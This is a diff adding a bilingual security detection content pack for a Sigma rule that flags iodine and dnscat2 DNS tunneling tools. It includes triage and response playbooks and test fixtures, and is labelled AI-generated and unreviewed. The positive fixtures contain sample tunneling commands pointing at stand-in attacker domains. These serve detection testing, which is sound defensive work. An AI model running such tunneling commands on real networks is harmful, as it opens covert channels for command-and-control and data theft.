@@ -1,0 +1,130 @@
+{
+  "rule": {
+    "id": "98a96a5a-64a0-4c42-92c5-489da3866cb0",
+    "title": "DNS Exfiltration and Tunneling Tools Execution",
+    "level": "high",
+    "status": "test",
+    "author": "Daniil Yugoslavskiy, oscd.community",
+    "path": "windows/process_creation/proc_creation_win_dns_exfiltration_tools_execution.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_dns_exfiltration_tools_execution.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1048.001",
+      "T1071.004",
+      "T1132.001"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó un proceso cuya ruta coincide con las herramientas de túnel DNS iodine (iodine.exe) o dnscat2. Esto suele indicar un intento de tunelizar comando y control o de exfiltrar datos por DNS.",
+      "what_it_detects": "Eventos de creación de procesos en Windows donde Image termina en \\iodine.exe o contiene \\dnscat2. La coincidencia se basa solo en la ruta del archivo, por lo que un binario renombrado no dispara la regla.",
+      "why_it_matters": "iodine y dnscat2 ocultan el tráfico dentro de consultas y respuestas DNS. Así un atacante puede evadir los controles de salida para comando y control (T1071.004), exfiltrar datos por un protocolo no cifrado distinto del C2 (T1048.001) y codificar datos con métodos estándar (T1132.001).",
+      "triage_steps": [
+        "Revise Image, CommandLine, User y el host. Identifique los argumentos de servidor DNS o dominio, como la opción --dns domain= de dnscat2 o el dominio del túnel de iodine.",
+        "Revise ParentImage y la línea de comandos del proceso padre. Explorer, cmd o PowerShell en una sesión interactiva indican uso manual; Office, servicios o scripts indican compromiso.",
+        "Obtenga el hash del binario y verifique su origen: ruta de descarga, Mark-of-the-Web o zone identifier, fecha de creación del archivo y reputación.",
+        "Pivotee a los logs DNS del host en +/- 15 minutos. Busque volumen alto de consultas, subdominios largos o aleatorios, registros TXT, CNAME o MX y consultas repetidas a un mismo dominio.",
+        "Busque procesos hijos y conexiones de red de la herramienta. Verifique si abrió una shell (cmd.exe, powershell.exe) o un adaptador de red virtual (iodine usa un adaptador TAP).",
+        "Busque alertas previas del mismo usuario y host, como staging de archivos, compresión o acceso a credenciales, y verifique si otros endpoints ejecutaron la misma herramienta."
+      ],
+      "false_positives": [
+        "Ejercicios de red team o pruebas de penetración autorizadas que usan dnscat2 o iodine.",
+        "Investigadores de seguridad o ingenieros de red que prueban en laboratorio la detección de túneles DNS.",
+        "Analistas que ejecutan las herramientas dentro de un sandbox de análisis de malware."
+      ],
+      "response_steps": [
+        "Confirme con el responsable del activo y el equipo de seguridad si hubo una prueba autorizada. Si no la hubo, trate la alerta como incidente.",
+        "Aísle el endpoint y bloquee el dominio del túnel y sus servidores autoritativos en los resolvers DNS y el firewall de salida.",
+        "Recolecte el binario, la memoria y los logs DNS. Estime el volumen exfiltrado a partir de las consultas y luego elimine la herramienta y cualquier persistencia.",
+        "Restablezca las credenciales del usuario afectado y restaure el host al terminar la investigación. Agregue el dominio a las listas de monitoreo."
+      ],
+      "severity_rationale": "El nivel alto corresponde porque estas herramientas casi nunca tienen un uso legítimo en endpoints corporativos y dan al atacante un canal encubierto para C2 y exfiltración."
+    },
+    "en": {
+      "summary": "A process ran from an image path that matches the DNS tunneling tools iodine (iodine.exe) or dnscat2. This often means someone is trying to tunnel command-and-control traffic or exfiltrate data over DNS.",
+      "what_it_detects": "Windows process creation events where Image ends with \\iodine.exe or contains \\dnscat2. The match uses only the file path, so a renamed binary will not trigger the rule.",
+      "why_it_matters": "iodine and dnscat2 hide traffic inside DNS queries and responses. That lets an attacker get past egress controls for command and control (T1071.004), exfiltrate data over an unencrypted non-C2 protocol (T1048.001) and encode data with standard methods (T1132.001).",
+      "triage_steps": [
+        "Review Image, CommandLine, User and the host. Note the DNS server or domain arguments, such as a dnscat2 --dns domain= option or an iodine tunnel domain.",
+        "Check ParentImage and the parent's command line. Explorer, cmd or PowerShell started from an interactive session points to a hands-on user; Office apps, services or scripts point to compromise.",
+        "Hash the binary and check where it came from: its download path, Mark-of-the-Web or zone identifier, file creation time and reputation.",
+        "Pivot to DNS logs for this host within +/- 15 minutes. Look for high query volume, long or random subdomains, TXT, CNAME or MX records, and repeated queries to one domain.",
+        "Look for child processes and network connections from the tool. Check whether it opened a shell (cmd.exe, powershell.exe) or a virtual network adapter (iodine uses a TAP adapter).",
+        "Look for earlier alerts on the same user and host, such as file staging, archiving or credential access, and check whether other endpoints ran the same tool."
+      ],
+      "false_positives": [
+        "Authorized red team exercises or penetration tests that use dnscat2 or iodine.",
+        "Security researchers or network engineers testing DNS tunneling detection in a lab.",
+        "Analysts running the tools inside a malware analysis sandbox."
+      ],
+      "response_steps": [
+        "Confirm with the asset owner and the security team whether a test was authorized. If it was not, treat the alert as an incident.",
+        "Isolate the endpoint and block the tunnel domain and its authoritative name servers at the DNS resolvers and the egress firewall.",
+        "Collect the binary, memory and DNS logs. Estimate how much data was exfiltrated from query volume, then remove the tool and any persistence.",
+        "Reset credentials for the affected user and restore the host after the investigation. Add the domain to monitoring watchlists."
+      ],
+      "severity_rationale": "High fits because these tools rarely have a legitimate use on corporate endpoints and give an attacker a covert channel for C2 and exfiltration."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "dnscat2 client run from the user's Downloads folder to tunnel to an attacker domain",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Users\\jperez\\Downloads\\dnscat2-v0.07-client-win32.exe",
+          "CommandLine": "dnscat2-v0.07-client-win32.exe --dns domain=tunnel.example.com --secret=placeholder",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe"
+        }
+      },
+      {
+        "description": "iodine client run from a temp directory",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\ProgramData\\tmp\\iodine.exe",
+          "CommandLine": "iodine.exe -f -P placeholder 192.0.2.53 t1.example.org",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentCommandLine": "powershell.exe -nop"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Legitimate nslookup querying a TXT record. The image path contains neither iodine.exe nor \\dnscat2",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\nslookup.exe",
+          "CommandLine": "nslookup -type=TXT dnscat2.example.com",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe"
+        }
+      },
+      {
+        "description": "Process whose name only partly matches (iodine-gui.exe): it does not end with \\iodine.exe and has no \\dnscat2 path segment",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0310.andes.example.com",
+          "User": "ANDES\\lgomez",
+          "Image": "C:\\Program Files\\IodineViewer\\iodine-gui.exe",
+          "CommandLine": "\"C:\\Program Files\\IodineViewer\\iodine-gui.exe\"",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "ParentCommandLine": "C:\\Windows\\explorer.exe"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
